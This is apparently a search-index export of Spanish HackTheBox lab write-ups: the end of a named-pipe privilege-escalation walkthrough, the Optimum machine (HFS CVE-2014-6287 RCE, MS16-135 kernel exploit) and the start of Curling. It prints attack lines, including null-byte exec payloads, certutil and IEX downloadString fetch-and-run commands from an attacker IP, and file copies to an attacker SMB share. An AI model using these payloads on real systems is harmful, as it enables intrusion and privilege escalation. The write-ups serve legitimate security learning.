Crea la comunicaci√≥n con el pipe  $pipeClient = new-object System. IO. Pipes. NamedPipeClientStream('. ', $PipeName, $PipeDir, $PipeOpt)  # Crea el objeto que nos permite enviarle la data al pipe  $sw = new-object System. IO. StreamWriter($pipeClient)  $pipeClient. Connect()  if (!$pipeClient. IsConnected) {    throw  Failed to connect client to pipe $pipeName   }  $sw. AutoFlush = $true  # Envia el  mensaje  al pipe  $sw. WriteLine($Message)}catch {  Write-Host  Error sending pipe message: $_  -ForegroundColor Red}finally {  # Entiendo que limpia las variables y cierra la conexion con el pipe  if ($sw) {    $sw. Dispose()    $sw = $null  }  if ($pipeClient) {    $pipeClient. Dispose()    $pipeClient = $null  }}Entonces, la idea es que al ejecutarlo nos pedir√° algo que ser√° enviado al Pipe, le indicaremos CLEAN C:\algo, y esto llegara (ojal√°) al servidor (server. exe) para ser procesado‚Ä¶ Generemos un archivo para hacer las pruebas: c:\Program Files\Cleanup&gt;echo  a vel  &gt; C:\\Users\Varg\Desktop\aja. txtEjecutamos el script: PS c:\Program Files\Cleanup&gt; . \writer. ps1Put message to send to pipe: CLEAN C:\\Users\Varg\Desktop\aja. txtRecibimos en el servidor un error: c:\Program Files\Cleanup&gt;server. exeCLEAN C:\\Users\Varg\Desktop\aja. txt: The filename, directory name, or volume label syntax is incorrect. Lo cual es muy raro porque estamos colocando la ruta que es‚Ä¶ AC√Å me perd√≠ completamente, as√≠ que decid√≠ pedir ayuda, ah√≠ apareci√≥ 4st1nus (Gracias de nuevo). Me indico que me apoyara de la herramienta IO Ninja para ver los procesos que hace el pipe, pero siguiendo la propia descripci√≥n de la web es:  IO Ninja is a professional, scriptable, multi-purpose terminal emulator, sniffer, and protocol analyzer. It‚Äôs aimed at network security experts, system administrators, and all kinds of software/hardware/embedded developers. Despu√©s de descargarla, para cargar el programa lo hacemos as√≠:  File &gt; New Session &gt; Pipe Monitor &gt; En la parte de arriba hay un select, escogemos File Name y escribimos la ruta C:\Program Files\Cleanup\client. exe &gt; volvemos al select y seleccionamos None &gt; Apply Filter &gt; Capture.  (Hacemos lo mismo para el binario server. exe). Y procedemos a ejecutar de nuevo nuestro script, (prob√© otra cosa para saber que todo fuera oki y en donde encontramos algo extra√±o): PS c:\Program Files\Cleanup&gt; . \writer. ps1Put message to send to pipe: CLEAN holaY en el IO Ninja vemos: Jmmm, algo extra√±o es que le agrega 2 puntos al final de la b√∫squeda y ese tiene pinta de ser el problema‚Ä¶ Despu√©s de un rato probando otras formas de jugar con el script, llegamos a una idea m√°s peque√±a: c:\Program Files\Cleanup&gt;type writer. ps1# Nos conectamos al pipe$pipe = New-Object System. IO. Pipes. NamedPipeClientStream( cleanupPipe );$pipe. Connect(); # Generamos objeto para interactuar con el pipe$sw = New-Object System. IO. StreamWriter($pipe);# Indicamos que borre el archivo que habiamos creado antes como prueba$sw. Write( CLEAN C:\\Users\Varg\Downloads\aja. txt );# Cerramos objetos$sw. Dispose(); $pipe. Dispose();Lo ejecutamos y obtenemos: Aparentemente va todo bien, pero en el servidor: c:\Program Files\Cleanup&gt;server. exe. . . CLEAN C:\\Users\Varg\Downloads\aja. txopen C:\\Users\Varg\Downloads\aja. tx: The system cannot find the file specified. Ahora le quita una letraaaaaaaaaaaaaaaaaa ü§£, pero bueno, ac√° es m√°s f√°cil, simplemente agregu√©mosle una al final de la cadena a ver si la interpreta bien: . . . $sw. Write( CLEAN C:\\Users\Varg\Downloads\aja. txt.  );. . . Y ahora obtenemos: c:\Program Files\Cleanup&gt;server. exe. . . CLEAN C:\\Users\Varg\Downloads\aja. txtPerfecto, al menos no nos reporta errores, validando si el archivo se borr√≥ realmente tenemos: PS C:\Program Files\Cleanup&gt; ls C:\\Users\Varg\Downloads\PS C:\Program Files\Cleanup&gt; Listones, y tambi√©n validemos que se haya generado el archivo encriptado en la ruta C:\ProgramData\Cleanup: PS C:\Program Files\Cleanup&gt; dir C:\ProgramData\Cleanup\  Directory: C:\ProgramData\CleanupMode         LastWriteTime     Length Name----         -------------     ------ -----a----     4/9/2021 25:25 PM      120 QzpcVXNlcnNcVmFyZ1xEb3dubG9hZHNcYWphLnR4dA==PS C:\Program Files\Cleanup&gt; type C:\ProgramData\Cleanup\QzpcVXNlcnNcVmFyZ1xEb3dubG9hZHNcYWphLnR4dA==1d30bfee9a03a2c8e2c9adb66ce895cf5949e2d2406bf0ec66077fc4fe37f6aefd558f64a636570de0db530327936f35e73638155d8f0b56361cb600Si decodeamos el nombre del archivo obtenemos C:\\Users\Varg\Downloads\aja. txt, as√≠ que perfecto, ahora hagamos el restore a ver como se procesa apoy√°ndonos de IO Ninja: PS C:\Program Files\Cleanup&gt; . \client. exe -R C:\\Users\Varg\Downloads\aja. txtRestoring C:\\Users\Varg\Downloads\aja. txtPS C:\Program Files\Cleanup&gt; ls C:\ProgramData\Cleanup\PS C:\Program Files\Cleanup&gt; Oko, parece que s√≠, validemos el proceso y si lo dejo en su ruta nativa: OHH, el restore ya lo hace con la cadena decodeada, interesante (adem√°s de que tenemos CLEANER y RESTORE para usar en dado caso con nuestro script). PS C:\Program Files\Cleanup&gt; ls C:\\Users\Varg\Downloads\  Directory: C:\\Users\Varg\DownloadsMode         LastWriteTime     Length Name----         -------------     ------ -----a----     4/9/2021 25:25 PM       16 aja. txtPS C:\Program Files\Cleanup&gt; type C:\\Users\Varg\Downloads\aja. txta vel‚Ä¶ Extraemos cualquier archivo del sistema üìå: Listoooooones, lo hace correctamente, tenemos un script funcional y sabemos como funciona CLEANER y RESTORE. Con esto en mente, ya podr√≠amos ver el path para extraer archivos como Administrator y aprovecharnos de ellos para ver su contenido, si a√∫n no lo ves, √©chale un poco de cabeza a ver como lo har√≠as e. e Listo, ¬øya lo tienes? Entonces‚Ä¶ Podemos aprovecharnos para extraer por ejemplo el archivo root. txt as√≠:  Estando en la m√°quina v√≠ctima subimos nuestro script con la l√≠nea $sw. Write( CLEAN C:\\Users\Administrator\Desktop\root. txt.  );.  Ejecutamos y ver√≠amos en la ruta C:\ProgramData\Cleanup\ el archivo encriptado.  Lo tomamos y nos lo pasamos a nuestra VM Windows.  Lo colocamos en la ruta C:\ProgramData\Cleanup\.  Aprovechamos el uso del RESTORE, le pasamos la ruta C:\\Users\Administrator\Desktop\root. txt, como hace la restauraci√≥n en la ruta original, en teor√≠a regenerar√≠a el archivo en el directorio C:\\Users\Administrator\Desktop\. D√©mosle‚Ä¶ Subimos script y ejecutamos, con esto generamos el CLEAN del archivo root. txt: PS C:\\Users\web\Videos&gt; . \certutil. exe -f -urlcache -split http://10. 10. 14. 164:8000/writer. ps1 writer. ps1PS C:\\Users\web\Videos&gt; type . \writer. ps1# Nos conectamos al pipe$pipe = New-Object System. IO. Pipes. NamedPipeClientStream( cleanupPipe );$pipe. Connect(); # Generamos objeto para interactuar con el pipe$sw = New-Object System. IO. StreamWriter($pipe);# Indicamos que borre el archivo$sw. Write( CLEAN C:\\Users\Administrator\Desktop\root. txt );# Cerramos objetos$sw. Dispose(); $pipe. Dispose();Ejecutamos y obtenemos el archivo: PS C:\\Users\web\Videos&gt; dir C:\ProgramData\Cleanup\  Directory: C:\ProgramData\CleanupMode         LastWriteTime     Length Name----         -------------     ------ -----a----     4/9/2021 25:25 PM      192 QzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0Nos lo pasamos a nuestra m√°quina, podemos hacer uso de la carpeta compartida: PS C:\\Users\web\Videos&gt; copy C:\ProgramData\Cleanup\QzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0 \\10. 10. 14. 164\smbFolder\QzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0Listo, ahora nos lo llevamos a la m√°quina virtual Windows y lo metemos en la ruta C:\ProgramData\Cleanup\: PS C:\Program Files\Cleanup&gt; ls C:\ProgramData\Cleanup\  Directory: C:\ProgramData\CleanupMode         LastWriteTime     Length Name----         -------------     ------ -----a----     4/9/2021 25:25 AM      192 QzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0Ahora intentamos restaurarlo, peeeeero antes, validamos que la ruta C:\\Users\Administrator\Desktop exista (en mi caso no, la creamos r√°pidamente): PS C:\Program Files\Cleanup&gt; ls -force c:\\Users  Directory: C:\\UsersMode         LastWriteTime     Length Name----         -------------     ------ ----d-r---     9/28/2020  1:22 PM        Publicd-----     3/29/2021  7:32 PM        VargPS C:\Program Files\Cleanup&gt; mkdir C:\\Users\AdministratorPS C:\Program Files\Cleanup&gt; mkdir C:\\Users\Administrator\DesktopPS C:\Program Files\Cleanup&gt; ls c:\\Users  Directory: C:\\UsersMode         LastWriteTime     Length Name----         -------------     ------ ----d-----     4/9/2021 11:43 AM        Administratord-r---     9/28/2020  1:22 PM        Publicd-----     3/29/2021  7:32 PM        VargPS C:\Program Files\Cleanup&gt; ls C:\\Users\Administrator\  Directory: C:\\Users\AdministratorMode         LastWriteTime     Length Name----         -------------     ------ ----d-----     4/9/2021 11:43 AM        DesktopAhora si restauramos: PS C:\Program Files\Cleanup&gt; . \client. exe -R C:\\Users\Administrator\Desktop\root. txtRestoring C:\\Users\Administrator\Desktop\root. txtPS C:\Program Files\Cleanup&gt; ls C:\ProgramData\Cleanup\PS C:\Program Files\Cleanup&gt; ls C:\\Users\Administrator\Desktop\  Directory: C:\\Users\Administrator\DesktopMode         LastWriteTime     Length Name----         -------------     ------ -----a----     4/9/2021 11:44 AM       34 root. txtüòÆ :O :o o. O üò≤ O. O ohhh‚Ä¶ Y si vemos su contenido: PS C:\Program Files\Cleanup&gt; type C:\\Users\Administrator\Desktop\root. txtdd355d81. . . . . . . . . . . . . . . . . . . . . . . . . . . 74OPAAAAA, pero claro que si!! Tenemos la flag, por lo tanto podemos leer cualquier archivo del sistema como usuario Administrator :O Perfectisimo‚Ä¶ Intentando generar una reverse Shell de alguna manera (no se me ocurre como) nos quedamos un buen rato pensando, pero nada, no lo logramos, si lo sabes me cuentas y lo agregamos al writeup de UNAAAAAAAAAAAA!! Hemos terminadooooowowowowowow. ‚Ä¶ Linda linda liiiiinda m√°quina. Me gusto bastante el camino para llegar al usuario web, fant√°stico el race condition que explotamos para modificar el contenido del archivo header. inc inyectando c√≥digo PHP mientras el servidor lo busca, na na na, muy lindo. El pensamiento lateral del privesc es incre√≠ble. Much√≠simas gracias por leerse otro writeup gigante, pero que espero les sirva tanto como a m√≠. ¬°Y como siempre, a seguir rompiendo!! "
    }, {
    "id": 23,
    "url": "http://localhost:4000/htb/optimum",
    "title": "HackTheBox - Optimum",
    "body": "2021/08/21 - M√°quina Windows nivel f√°cil. Evitamos los filtros que nos ponga HTTP File Server, transformamos (transformers (optimus prime (optimum (nombre bien pensado eh!)))) nuestra arquitectura y explotamos el siempre triste kernel.  TL;DR (Spanish writeup): Creada por: ch4p (e l c r e a d o r). Vamos a ‚Äútransformer‚Äù nuestro destino. Encontraremos un servidor web con el servicio HTTP File Server en su versi√≥n 2. 3, jugaremos con eso para entender una vulnerabilidad y ejecutar comandos con ella en el sistema. Obtendremos una reverse Shell como el usuario kostas. Nuestra terminal estar√° limitada a ejecutar procesos de 32 bits, moveremos fichas para generar una nueva, pero que nos permita ejecutar instrucciones de 64 bits, pero ¬øpara qu√©?‚Ä¶ Encontraremos varios caminos para escalar privilegios, usaremos uno que se aprovecha del kernel (MS16-135), peeeeeeeeero para su correcta ejecuci√≥n necesitaremos estar en una arquitectura de 64 bits. E AY LHA RASON! ‚Ä¶ Clasificaci√≥n de la m√°quina seg√∫n la gentesita: Vulns conocidas peeeero le cuesta llegar a ser real :(  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice. ‚Ä¶ Eclipse eterno.  Reconocimiento.      Enumeraci√≥n de puertos con nmap.     Enumeraci√≥n.      Exploramos el servicio HFS sobre el puerto 80.     Explotaci√≥n: jugamos con el servicio HFS.      Validamos ejecuci√≥n remota de comandos usando CVE-2014-6287.     Escalada de privilegios.      Descubrimos la arquitectura real en la que corren nuestros scripts de PowerShell.    Explotamos el kernel y obtenemos sesi√≥n como nt authority\system.    ‚Ä¶ Reconocimiento #‚Ä¶ Enumeraci√≥n de puertos con nmap üìå: Empezaremos viendo que puertos tiene abiertos externamente la m√°quina, esto nos sirve para empezar a direccionar nuestra investigaci√≥n y posterior enumeraci√≥n. Usaremos nmap: ‚ù± nmap -p- --open -v 10. 10. 10. 8 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n extractPorts de S4vitar que me extrae los puertos en la clipboard   Ese escaneo nos muestra: # Nmap 7. 80 scan initiated Wed Aug 18 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 8# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 8 ()	Status: UpHost: 10. 10. 10. 8 ()	Ports: 80/open/tcp//http///	Ignored State: filtered (65534)# Nmap done at Wed Aug 18 25:25:25 2021 -- 1 IP address (1 host up) scanned in 274. 47 seconds      Puerto   Descripci√≥n         80   HTTP: Nos brinda un servidor web (pagina web).    Ya que sabemos que solo el puerto 80 esta expuesto, vamos a ver que versi√≥n y scripts tienen relaci√≥n con ese puerto, en este caso al ser un solo puerto no es necesario usar la funci√≥n extractPorts que referenciamos antes, pero en caso de contar con muuuuuchos puertos esta muy bien usarla y no copiar uno a uno cada puerto. ‚ù± nmap -p 80 -sC -sV 10. 10. 10. 8 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   Y con este escaneo obtenemos: # Nmap 7. 80 scan initiated Wed Aug 18 25:25:25 2021 as: nmap -p 80 -sC -sV -oN portScan 10. 10. 10. 8Nmap scan report for 10. 10. 10. 8Host is up (0. 11s latency). PORT  STATE SERVICE VERSION80/tcp open http  HttpFileServer httpd 2. 3|_http-server-header: HFS 2. 3|_http-title: HFS /Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Wed Aug 18 25:25:25 2021 -- 1 IP address (1 host up) scanned in 20. 80 secondsTenemos algunas cositas relevantes:       Puerto   Servicio   Versi√≥n         80   HTTP   HttpFileServer httpd 2. 3    Servicio Http File Server en su versi√≥n 2. 3. Por ahora nada m√°s (aunque ya con la versi√≥n es bastante e. e). Exploremos el servidor web a ver como romperlo. ‚Ä¶ Enumeraci√≥n #‚Ä¶ Puerto 80 üìå: Como vimos existe un servicio llamado Http File Server montado en el puerto 80, pues valid√©moslo y en dado caso conozcamos de que se trata‚Ä¶ Un poco feita la interfaz üòÅ, pero vemos varias cositas, un link hacia un login, una barra de b√∫squeda (jmm) y de los dem√°s botones el √∫nico llamativo es Get list en Actions, el cual nos redirecciona a: http://10. 10. 10. 8/?tpl=list&amp;folders-filter=\&amp;recursiveY quiz√°s podr√≠amos jugar con ella‚Ä¶ Veamos de que se trata HFS: üåé HFS (HTTP File Server) es un servidor web dise√±ado para publicar y compartir archivos. Bien, sencillito. Pues recordemos que tenemos una versi√≥n del software, vamos a la web y busquemos cositas relacionadas con esa versi√≥n, quiz√°s hay vulnerabilidades conocidas‚Ä¶ ‚Ä¶ Explotaci√≥n #Buscando llegamos a este CVE:  cve. mitre. org - CVE-2014-6287. Se trata de una ejecuci√≥n remota de comandos -gracias- a una pobre sanitizaci√≥n llevada a cabo por expresiones regulares sobre el archivo ParserLib. pas. La explotaci√≥n se logra mediante un null byte (%00), ya que bypassea el regex, detiene tooodo lo anterior a √©l y simplemente ejecuta lo que este despu√©s, o sea, nuestros comandos locochones‚Ä¶ ‚ö™‚ö™‚ö™ Null bytes are put in place to terminate strings or be a place holder in code, and injecting these into URLs can cause web applications to not know when to terminate strings and manipulate the applications. whitehatsec. Uff suena prometedor, investigando un poquito m√°s llegamos es este recurso:  Vulnerability analysis of HFS 2. 3. Un an√°lisis de la vuln, esta bien detallado, √©chenle un ojo. Validamos RCE explotando CVE-2014-6287 üìå: Leyendo sobre la explotaci√≥n, todo pasa en el apartado search (en nuestra enumeraci√≥n anterior lo vimos). Una consulta normal por ejemplo del texto hola, redireccionar√≠a a: http://10. 10. 10. 8/?search=holaY ver√≠amos esto: Nada anormal‚Ä¶ En el caso de la explotaci√≥n la consulta ser√≠a distinta, ya que se le agrega el null byte para bypassear el filtro regex yyyyyy simplemente agregar√≠amos el comando a ejecutar: http://10. 10. 10. 8/?search=hola%00{. exec|aca_el_comando_a_ejecutar. }Por ejemplo: http://10. 10. 10. 8/?search=hola%00{. exec|whoami. }En la respuesta ver√≠amos: Lo √∫nico distinto que vemos es un s√≠mbolo al lado de hola, pero no tenemos el reflejo del comando whoami üòî Como una de las pruebas que debemos hacer seria intentar lanzarnos paquetes ICMP con ayuda del comando ping, si en nuestra m√°quina recibimos los paquetes entonces confirmamos que existe la ejecuci√≥n remota de comandos solo que no se reflejan en la web. Pues pong√°monos en escucha por la interfaz tun0 (donde se monta la VPN, en mi caso solo tengo la de HTB**, la confirman con ipconfig o ip a) y estemos atentos por si llegan paquetes ICMP (que son los que env√≠a el comando ping): ‚ù± tcpdump -i tun0 icmpY ahora desde la web lanzamos: http://10. 10. 10. 8/?search=hola%00{. exec|ping%2010. 10. 14. 2. }Pero no recibimos nada, seguimos probando‚Ä¶ Yyyy finalmente llegamos al resultado de este intento: http://10. 10. 10. 8/?search=hola%00{. exec|powershell. exe -c  ping 10. 10. 14. 2 . }Cuando lo ejecutamos en la web no vemos nada reflejado (tampoco deber√≠a), peeeeeeeeeeero en nuestro analizador de tr√°fico: Vemos los paquetes enviados por la direcci√≥n IP 10. 10. 10. 8 (la m√°quina v√≠ctima) hacia nuestra m√°quina, as√≠ que existe la ejecuci√≥n remota de comandos (: YYYYYYYYYYYYYy entendimos como funciona la vulnerabilidad.  ‚Ä¶ Ahora que sabemos que los comandos se est√°n ejecutando podemos aprovecharnos de un exploit p√∫blico el cual lanza una reverse Shell generada con PowerShell, la encodea a base64 y como comandos que ejecutara el sistema le indica que decodee la cadena y la interprete. No debemos ponernos en escucha, ya que el mismo script lo hace: nc -nlvp el_puerto_que_le_indiquemos.  HFS (HTTP File Server) 2. 3. x - Remote Command Execution (3). Lo descargamos y en su c√≥digo cambiamos las variables lhost por nuestra direcci√≥n IP y lport por el puerto en el que queremos recibir la Shell. (El exploit fue creado para esta m√°quina, ya que trae por default que el servidor vulnerable esta sirviendo en la direcci√≥n IP 10. 10. 10. 8) Y ahora si lo ejecutamos: ‚ù± python3 hfsRCE. py PEEEEEEEEEEEEEEEERFECTIIIIIIIIIIiii11isadifjoasdifjSIMOOOOOOOoo, tenemos una PowerShell en el sistema como el usuario kostas (: ‚Ä¶ Escalada de privilegios #Despu√©s de estar en un laberinto suuuuuuuper largo finalmente conseguimos explotar esta vaina. Enumerando el sistema vemos que podemos ejecutar systeminfo, aprovechemos las muuuuuuchas herramientas que existen para ver si el kernel o la versi√≥n del SO tiene alguna vulnerabilidad.  Apoyados en esta gu√≠a de PrivEsc caemos en nuestro siguiente recurso. El que nos muestra unos resultados sencillos y directos es Sherlock (que ya esta obsoleto, pero sigue funcionando), Sherlock es un script de PowerShell que busca vulnerabilidades relacionadas con ‚Äúparches‚Äù del sistema. Entonces, podemos ya sea, descargar el archivo, subirlo e importar su funci√≥n principal llamada Find-AllVulns (si revisas el c√≥digo la vez) oooooooo simplemente descargarlo, levantar un servidor web y desde la consola de PowerShell indicarle que cargue un m√≥dulo (el contenido) de x URL (nuestro script de Sherlock. ps1), hagamos esta √∫ltima:  https://github. com/rasta-mouse/Sherlock/blob/master/Sherlock. ps1. Levantamos servidor web donde est√© el archivo: ‚ù± python3 -m http. serverY ahora desde la PS indicamos: IEX(New-Object Net. Webclient). downloadString('http://10. 10. 14. 2:8000/Sherlock. ps1')Ya el contenido del script estar√≠a importado como un m√≥dulo en el sistema, nos quedar√≠a llamarlo: PS C:\\Users\kostas\Videos&gt; Find-AllVulnsDe los resultados que arroja detallamos estos: Existen 3 vulnerabilidades que parecen afectar el sistema, pues empecemos a profundizar a ver‚Ä¶ Descubrimos arquitectura real en la que corren nuestros scripts de PowerShell (PS) üìå: Dejando algunos objetos de lado llegamos al bolet√≠n MS16-135, la explotaci√≥n de esa vuln es dada gracias a un problema con el kernel que permite escalar privilegios sin importar que usuario seamos‚Ä¶ Les dejo estos dos recursos para que profundicen:  C√≥mo explotar el bug de MS16-135 en Windows x64 con PowerShell &amp; Metasploit ‚ÄúLike a Boss‚Äù.  Digging Into a Windows Kernel Privilege Escalation Vulnerability: CVE-2016-7255. Enfocados en ese bolet√≠n llegamos a esta prueba de concepto en PS:  MS16-135. ps1. Haremos lo mismo que con Sherlock, descargamos el recurso, levantamos servidor web e importamos su contenido. En este caso no tendremos que llamar ninguna funci√≥n porque el c√≥digo no esta en ninguna, por lo que una vez ejecutemos: IEX(New-Object Net. Webclient). downloadString('http://10. 10. 14. 2:8000/MS16-135. ps1')Interpretara el c√≥digo y lo ejecutara‚Ä¶ El output despu√©s de ejecutarlo es confuso: Pero si validamos systeminfo tenemos: PS C:\&gt; systeminfo. . . System Type:        x64-based PC. . . WTF, deber√≠a funcionarnos el script, ya que SI estamos en una arquitectura x64‚Ä¶ ¬øO no? Pues buscando info para validar esto encontramos este post:  4 Ways to Find OS Architecture using PowerShell (32 or 64 bit). En la cuarta forma de validarlo quedamos anonadados üò≤ Solo podemos obtener dos respuestas: 4 (44=32 (32 bits)) u 8 (88=64 (64 bits)). Veamos: PS C:\&gt; [System. IntPtr]::Size4üôÜ‚Äç‚ôÇÔ∏è kheeeeeeeeeeeeeeeeeeeeeee!! HOY (un d√≠a): No he encontrado √©l -porque- de esto, seguir√© investigando y dejar√© un update :P UPDATE (3 d√≠as despu√©s): Seg√∫n 0xdf en su writeup: ‚ÄúThat is because the HFS process is likely running as a 32-bit process‚Äù. Intentando corroborar lo obtenido llegamos a este hilo en stackoverflow:  check processor architecture and proceed with if statement. Usando: [System. Environment]::Is64BitProcessPodemos validar si los procesos ejecutados est√°n siendo tomados desde una arquitectura 64 bits: PS C:\&gt; [System. Environment]::Is64BitProcessFalseY no, confirmamos que no estamos en una arquitectura de 64 bits sino en una de 32 bits‚Ä¶ Buscando maneras de cambiarnos a 64 bits llegamos a este nuevo hilo:  How to launch 64-bit powershell from 32-bit cmd. exe?. La que nos permite el cambio es ejecutar powershell desde la ruta nativa, esto para poder ejecutar c√≥digo de 64 bits sobre una arquitectura de 32 bits. Pues hagamos la f√°cil, modifiquemos el script con el que obtuvimos la reverse Shell y en vez de llamar powershell. exe sin ruta absoluta, agregu√©mosle la ruta nativa y validemos si conseguimos estar en 64 bits: Ejecutamos yyyyyyyyyyyyyyyyyyyy: LISTOOOOOOOOOOOOOOOOOOOOOOOONEEEEEEES, ahora s√≠√≠√≠√≠√≠√≠√≠ ‚Ä¶‚Ä¶ AHHHHHHHHHHHHHHHHHHHHHHHHHHLKfjsadklfjl√±aksdlkjld e. e Conseguimos Shell como nt authority\system üìå: Volvamos a ejecutar el contenido del script (ya no deber√≠amos ver ese error): PS C:\&gt; IEX(New-Object Net. Webclient). downloadString('http://10. 10. 14. 2:8000/MS16-135. ps1' ¬°DE MARAVILLA!! Ya funciona, pero parece que todo esta igual ¬øno? e. e Puesssssssssssssss: Tamos tamos tamoooooooooooooooooooooooooooos, hemos migrado al usuario nt authority\system y obtenido una terminal como √©l (: Linda manera de escalar, me g u s t o. Ya podr√≠amos ver las flags: ‚Ä¶ Me gusto bastante la m√°quina, sobre todo la escalada, no me hab√≠a topado con ese ‚Äúproblema‚Äù de estar en una arquitectura pero a la vez no, loco loco. Este es el final de nuestro encuentro, pero nos leeremos con m√°s cositas, bendiciones, besitos y como siempre, a seguir rompiendo tooooooooooooodo!! "
    }, {
    "id": 24,
    "url": "http://localhost:4000/htb/curling",
    "title": "HackTheBox - Curling",
    "body": "2021/08/21 - M√°quina Linux nivel f√°cil. Ojos bien abiertos en la p√°gina web, jueguitos con templates de Joomla, loops de backups (?), movimientos sensuales con un archivo de configuraci√≥n de cURL y ayudamos al usuario root a renovar su contrase√±a modificando el archivo /etc/shadow.  TL;DR (Spanish writeup): Creada por: L4mpje. Juegue juegue, todo pelota! Encontraremos un servidor web con el gestor de contenido Joomla bastante juguet√≥n, inspeccionaremos c√≥digo y texto para extraer credenciales. Estas nos ser√°n v√°lidas contra el panel admin de Joomla. Estando dentro modificaremos un template para que interprete c√≥digo PHP ‚Äúmalicioso‚Äù, usaremos esto para obtener una Reverse Shell como el usuario www-data. En el sistema, espec√≠ficamente en la carpeta /home del usuario floris encontraremos un archivo llamado password_backup, el tipo de archivo nos indicar√° que es un comprimido, pero al descomprimirlo obtenemos otro comprimido, jugaremos con eso para despu√©s de unas cuantas descompresiones obtener el archivo password. txt y conseguir una Shell como el usuario floris en el sistema. Nos daremos cuenta de que el usuario root esta ejecutando unas instrucciones automatizadas que interact√∫an con dos archivos a los que tenemos acceso, input y report. input es un archivo de configuraci√≥n de cURL (o sea, toma el contenido y si son comandos usados por curl, los ejecuta) y report guarda la respuesta de la petici√≥n o configuraci√≥n dada en input. Haremos que el archivo input lea archivos del sistema jugando con file://, como la instrucci√≥n la ejecuta root podemos leer cualquier archivo. Usaremos esa habilidad para modificar el archivo /etc/shadow con otra contrase√±a para el usuario root, esto para obtener una Shell en el sistema como √©l. ‚Ä¶ Clasificaci√≥n de la m√°quina seg√∫n la gentesita: Algo juguetona, pero toca temas realistas y conocidos.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice. ‚Ä¶ Vivo vivito.  Reconocimiento.      Enumeraci√≥n de puertos con nmap.     Enumeraci√≥n.      Recorremos CMS Joomla.     Explotaci√≥n.      Modificamos template de Joomla para conseguir ejecuci√≥n remota de comandos.    Obtenemos Reverse Shell en el sistema como www-data.     Movimiento lateral backup_password: Vamos de www-data a floris.      Jugamos a descomprimir el comprimido del comprimido.     Escalada de privilegios.      Explotando el archivo que toma cURL como ‚Äúconfiguraci√≥n‚Äù.    Cambiamos la contrase√±a del usuario root para obtener una Shell.    ‚Ä¶ Reconocimiento #‚Ä¶ Enumeraci√≥n de puertos con nmap üìå: Inicialmente necesitamos saber que puertos tiene abiertos la m√°quina, los descubriremos con nmap: ‚ù± nmap -p- --open -v 10. 10. 10. 150 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n extractPorts de S4vitar que me extrae los puertos en la clipboard   El escaneo nos devuelve dos puertos: # Nmap 7. 80 scan initiated Thu Aug 19 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 150# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 150 ()	Status: UpHost: 10. 10. 10. 150 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///# Nmap done at Thu Aug 19 25:25:25 2021 -- 1 IP address (1 host up) scanned in 104. 58 seconds      Puerto   Descripci√≥n         22   SSH: Tenemos la opci√≥n de obtener una Shell de forma segura.        80   HTTP: Esta sirviendo un servidor web.    Ahora tenemos que profundizar un poco, necesitamos saber que versiones y script est√°n siendo ejecutad@s por cada servicio (puerto), as√≠ nuestra pr√≥xima investigaci√≥n es muuucho m√°s peque√±a: ~(Usando la funci√≥n extractPorts (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno ‚ù± extractPorts initScan [*] Extracting information. . .   [*] IP Address: 10. 10. 10. 150  [*] Open ports: 22,80[*] Ports copied to clipboard)~ ‚ù± nmap -p 22,80 -sC -sV 10. 10. 10. 150 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   Obtenemos: # Nmap 7. 80 scan initiated Thu Aug 19 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10. 10. 10. 150Nmap scan report for 10. 10. 10. 150Host is up (0. 11s latency). PORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 7. 6p1 Ubuntu 4 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)|  256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)|_ 256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)80/tcp open http  Apache httpd 2. 4. 29 ((Ubuntu))|_http-generator: Joomla! - Open Source Content Management|_http-server-header: Apache/2. 4. 29 (Ubuntu)|_http-title: HomeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Thu Aug 19 25:25:25 2021 -- 1 IP address (1 host up) scanned in 12. 56 